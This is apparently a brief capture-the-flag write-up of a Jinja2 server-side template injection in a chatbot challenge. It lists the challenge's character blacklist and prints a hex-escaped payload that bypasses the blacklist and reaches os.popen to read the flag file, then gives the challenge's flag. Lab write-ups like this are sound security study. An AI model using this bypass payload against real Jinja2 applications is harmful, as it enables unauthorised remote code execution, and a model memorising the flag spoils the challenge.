# Unintelligible-Chatbot

After realizing it was a SSTI chall after using `{{7*7}}` as input and getting 49 as output, I went for RCE but saw that it was blocking most of the common chars like `_ . [ ] join`. <br>

![image](https://github.com/user-attachments/assets/1db4d9d3-fca3-4358-952c-91002d6d95a8)

Some of these characters and words are blacklisted:
> '#' <br>
> % <br>
> [] <br>
> _ <br>
> config <br>
> dict <br>
> subclasses <br>

I then just ripped off the following payload from [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection).

```py
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat${IFS}flag')|attr('read')()}}
```
![image](https://github.com/user-attachments/assets/47109d42-037c-4f5a-9a6b-a251e0a1dbbc)

ls -> cat flag

## Flag

`flag{n07_4n07h3r_5571_ch4ll3n63}`
